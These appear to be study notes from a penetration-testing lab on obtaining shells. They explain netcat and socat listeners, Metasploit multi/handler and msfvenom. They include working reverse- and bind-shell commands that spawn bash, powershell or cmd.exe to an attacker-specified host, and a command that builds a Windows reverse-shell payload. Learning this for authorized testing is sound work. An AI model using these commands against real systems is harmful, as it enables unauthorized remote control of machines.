##### what is a shell?
In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows.
In simple terms, we can force the remote server to either send us command line access to the server (a **reverse** shell), or to open up a port on the server which we can connect to in order to execute further commands (a **bind** shell).

#### Tools
**Netcat:** - it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques.

The syntax for starting a netcat listener using Linux is this: `nc -lvnp <port-number>`
- **-l** is used to tell netcat that this will be a listener
- **-v** is used to request a verbose output
- **-n** tells netcat not to resolve host names or use DNS.
- **-p** indicates that the port specification will follow.
	
	==Netcat Shell Stabilisation==
	_Technique 1: Python_
	![](https://i.imgur.com/bQnFz1T.png)
	Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.
	
	_Technique 2: rlwrap_
	rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
	
	To use rlwrap, we invoke a slightly different listener:
	`rlwrap nc -lvnp <port>`  
	Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
	
	_Technique 3: Socat_	

**Socat:** - it is like netcat on steroids. It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:
1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

	_Reverse Shells_
	Here's the syntax for a basic reverse shell listener in socat:  
	`socat TCP-L:<port> -`  
	As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.
	
	On Windows we would use this command to connect back:
	`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`  
	The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.  
	
	This is the equivalent command for a Linux Target:
	`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
	
	_Bind Shells_
	On a Linux target we would use the following command:
	`socat TCP-L:<PORT> EXEC:"bash -li"`  
	
	On a Windows target we would use this command for our listener:
	`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`  
	We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  
	
	Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
	`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

**Metasploit -- multi/handler:** - it is the `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells.

1. Open Metasploit with `msfconsole`
2. Type `use multi/handler`, and press enter
	We are now primed to start a multi/handler session. Let's take a look at the available options using the `options` command:
	![](https://i.imgur.com/qIr6o2B.png)  
	

**Msfvenom:** - Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly.

The standard syntax for msfvenom is as follows:
`msfvenom -p <PAYLOAD> <OPTIONS>`  

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

Here we are using a payload and four options:
- **-p** - `<OS>/<arch>/<payload>` 
- **-f** < format> - Specifies the output format. In this case that is an executable (exe).
- **-o** < file> - The output location and filename for the generated payload.
- **LHOST=**< IP > - Specifies the IP to connect back to.
- **LPORT=**< port> - The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

	`shell_reverse_tcp` This indicates that it was a _stageless_ payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:`shell/reverse_tcp` it indicated with (`/`).


####  Types of Shell
At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.
- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection.
e.g:(use *netcat*)
On the attacking machine:                        On the target:
`sudo nc -lvnp 443`                                      `nc <LOCAL-IP> <PORT> -e /bin/bash`  

![](https://i.imgur.com/rN7YkJJ.png)

- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way.
e.g:
On the target:                                   On the attacking machine:
`nc -lvnp <port> -e "cmd.exe"`                 `nc MACHINE_IP <port>`  

![](https://i.imgur.com/6GUwZsw.png)


